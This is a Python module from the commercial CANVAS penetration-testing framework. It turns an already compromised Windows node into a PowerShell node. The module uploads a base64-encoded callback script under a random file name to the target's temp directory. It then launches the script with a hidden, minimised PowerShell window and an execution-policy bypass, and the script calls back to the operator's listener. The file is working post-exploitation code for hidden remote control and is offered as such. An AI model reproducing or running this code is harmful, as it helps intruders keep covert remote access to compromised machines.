#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os
from exploitutils import *
import canvasengine

from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
from Nodes.mosdef_powershell.mosdef_powershell import *

import logging

NAME                    = "converttopowershell"
DESCRIPTION             = "Builds, uploads and runs a PowerShell callback script. This is useful when you have a Win32Node or Win64Node and want powershell capabilities"
DOCUMENTATION           = {}
DOCUMENTATION["Notes"] ="""
This module will attempt to start a new PowerShell Node after you have broken in with a WIN32/WIN64 exploit.
Create a powershell callback script and upload it to the target then run powershell with a proper payload in 
order to execute it.

Tested on:
(+) Windows 7 Ultimate N x32 with Powershell 2.0
(+) Windows 7 Ultimate N x64 with Powershell 2.0
(+) Windows 8.1 x32 with Powershell 4.0
"""
VERSION                 = "1.0"

PROPERTY                = {}
PROPERTY['TYPE']        = "Commands"
PROPERTY['SITE']        = "Local"
PROPERTY['ARCH']        = [ ["Windows"] ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result    = ""
        self.name      = NAME
        self.ps_mosdef = None 

    def init_listener(self):
        passednodes = self.argsDict["passednodes"]
        rv = []
        for node in passednodes:
            nodetype = node.nodetype

            if not nodetype.upper() in ["WIN32NODE", "WIN64NODE"]: # What about JavaNode?
                #self.log("Node %s is not able to convert to a MOSDEF node! Did you select a LocalNode?" % node.get_name())
                logging.warning("Node %s is not able to convert to a MOSDEF node! Did you select a LocalNode?" % node.get_name())
                continue
        
            logging.info("Initializing Universal Listener for target OS: Windows")
            l = canvasengine.UNIVERSAL_MOSDEF
            
            if l not in rv:
                rv.append(l)
            else:
                logging.warning("No listener type is configured for Windows on node %s" % node.get_name())

        if len(rv) > 1:
            logging.info("More than one listener type required (%s), which isn't supported yet, sorry. You'll probably only get some of your shells." % repr(rv))

        if rv and not self.callback and self.engine:
            self.callback = self.engine.autoListener(self, rv[0], host = self.target.interface, autoFind = False)

        if not rv:
            devlog("converttopowershell", "initlistener: rv is empty list!")
            logging.error("initlistener: rv is empty list!")

        return rv

    def run(self):
        self.setInfo("%s (in progress)"%(NAME))

        self.init_listener()
        
        self.result = []
        for node in self.argsDict["passednodes"]:
            nodetype = node.nodetype

            if nodetype.upper() in ["WIN32NODE", "WIN64NODE"]: # What about JavaNode?
                try:
                    # Create mosdef powershell callback
                    self.ps_mosdef = mosdef_powershell(self)
                    self.ps_mosdef.createMosdefCallback() 
                    source = self.ps_mosdef.getMosdefCallbackStream(base64encode=True)
                    
                    # upload callback script in base64
                    filename = "".join( [ random.choice(string.uppercase) for x in range(10) ] )
                    fullpath = "{}{}.ps1".format(node.shell.GetTempPathA(), filename)
                    ret = node.shell.upload( source , ".\\", fullpath , sourceisbuffer=True )
                    
                    if not ret:
                        logging.info("Failed to upload a powershell callback for node %s" % node.get_name())
                        self.result+=[0]
                        break 

                    # Create powershell command
                    ps_command = self.ps_mosdef.generatePSCommand(b64encode=True, encoding="ASCII", compression=False, externalSource=fullpath)
                    # We add start /MIN to avoid showing the console
                    fn = 'cmd /c start /MIN powershell.exe -WindowStyle hidden -ex bypass -c %s' % ps_command
                    fn = fn.encode('ascii')

                    logging.info("Send commands: %s" % fn)
                    r = node.spawn(fn)
                    logging.info("Running powershell callback")
                    #r = node.runcommand(fn)
                    # can't call self.ISucceeded here, as we're stuck! (This will fail to bounce!
                    succeeded = self.ISucceeded()
                    #logging.info("Run command returned: %s" % r)
                    self.result.append(1)
                except Exception,err:
                    logging.info("Failed to build and upload a powershell callback for node %s" % node.get_name())
                    logging.error("Error while building powershell callback: %s" % (err))
                    #self.log_error("Error while building powershell callback: %s" % (err))
                    self.result+=[0]
                    break
            else:
                logging.error("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result+=[0]

        if 1 in self.result:
            ret = 1
        else:
            ret = 0

        self.setInfo("%s - (finished)" % (NAME))
        return ret

